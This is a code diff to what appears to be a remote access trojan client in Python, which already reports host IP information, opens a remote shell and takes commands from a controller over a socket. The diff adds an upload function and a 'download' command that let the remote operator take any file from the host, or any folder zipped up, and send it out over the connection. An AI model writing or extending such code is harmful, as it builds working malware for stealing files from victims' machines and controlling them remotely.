@@ -1,4 +1,5 @@
 import platform
+import shutil
 import socket
 import sys
 import urllib.request
@@ -36,7 +37,6 @@ def recvall(sock, n):
         packet += frame  
     return packet  
 
-
 def get_ip_info(sock):
         try:
             lip = str(socket.gethostbyname(socket.gethostname()))
@@ -51,6 +51,27 @@ def get_ip_info(sock):
             send(sock, output)
         except Exception as e:
             print(f"Error IP info: {e}") 
+
+def upload(sock, path):
+    if os.path.exists(path):
+        file_name = os.path.basename(path)
+        try:
+            if os.path.isdir(path):
+                zip_file = shutil.make_archive(file_name, 'zip', path)
+                with open(zip_file, "rb") as f:
+                    file_data = f.read()
+                os.remove(zip_file)
+                send(sock, f"FILE_NAME: {file_name}.zip".encode())
+                send(sock, file_data)
+            else:
+                with open(path, "rb") as f:
+                    file_data = f.read()
+                send(sock, f"FILE_NAME: {file_name}".encode())
+                send(sock, file_data)
+        except Exception as e:
+            send(sock, f"ERROR: Could not read file. {str(e)}".encode())
+    else:
+        send(sock, "ERROR: File or folder not found.".encode())
     
 def kill_connection(sock):
         sock.close()
@@ -100,6 +121,10 @@ def handle_cmd(sock):
                 
                 elif cmd == "shell":
                     handle_shell(sock)
+
+                elif cmd.startswith("download "):
+                    path = cmd[len("download "):].strip()
+                    upload(sock, path)
                     
                 elif cmd.lower() == "kill":
                     kill_connection(sock)
